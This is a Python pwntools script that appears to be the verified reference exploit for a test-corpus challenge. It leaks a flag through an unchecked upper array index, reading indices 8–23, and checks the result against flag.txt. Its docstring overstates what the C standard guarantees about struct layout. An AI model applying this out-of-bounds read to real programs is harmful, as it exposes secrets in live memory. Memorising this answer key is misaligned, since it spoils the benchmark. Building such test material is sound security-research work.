#!/usr/bin/env python3
"""Hand-verified reference exploit for corpus_r2/14_oob_read_flag_array.

Technique: `vuln()` only checks `idx < 0`; there is no upper bound at all,
so any `idx >= 8` reads past `d.arr` into `d.secret`, a 64-byte buffer the
C standard guarantees sits immediately after `arr` in the same struct
(ascending declaration order). `d.secret` is populated from flag.txt at
startup (never a compiled-in literal), so this still has to read genuinely
-live process memory, not a constant.

Reading idx = 8..23 (16 ints = 64 bytes = sizeof(d.secret)) recovers the
whole flag 4 bytes at a time from the printed decimal values, with no
address leak, shell, or control-flow hijack needed at all -- purely a
data-only indexing bug.

Necessity: any idx in [0, 7] only reads the (non-secret) `arr` array --
see ablation.py's "in-bounds indices only" case.
"""
import os
import struct
import sys

from pwn import context, process

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "corpus_r2", "14_oob_read_flag_array",
                    "oob_read_flag_array")

context.log_level = "error"
context.arch = "amd64"


def main():
    io = process(BIN, cwd=os.path.dirname(BIN))

    secret_words = []
    for idx in range(8, 24):  # d.secret is 64 bytes = 16 ints, starting right after arr[8]
        io.recvuntil(b"index: ")
        io.sendline(str(idx).encode())
        line = io.recvline().decode(errors="replace")
        # "arr[<idx>] = <value>"
        value = int(line.strip().split("=")[-1].strip())
        secret_words.append(value & 0xFFFFFFFF)

    io.recvuntil(b"index: ")
    io.sendline(b"-1")  # terminate the query loop cleanly (idx<0 -> "bad", then EOF close)
    io.close()

    raw = b"".join(struct.pack("<I", w) for w in secret_words)
    recovered = raw.split(b"\x00", 1)[0].decode(errors="replace")

    flag_file = os.path.join(HERE, "..", "corpus_r2", "14_oob_read_flag_array",
                              "flag.txt")
    with open(flag_file) as f:
        expected = f.read().strip()

    if expected == recovered:
        print(f"[+] PASS: flag recovered: {recovered}")
        return 0
    print(f"[-] FAIL: expected {expected!r}, recovered {recovered!r}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
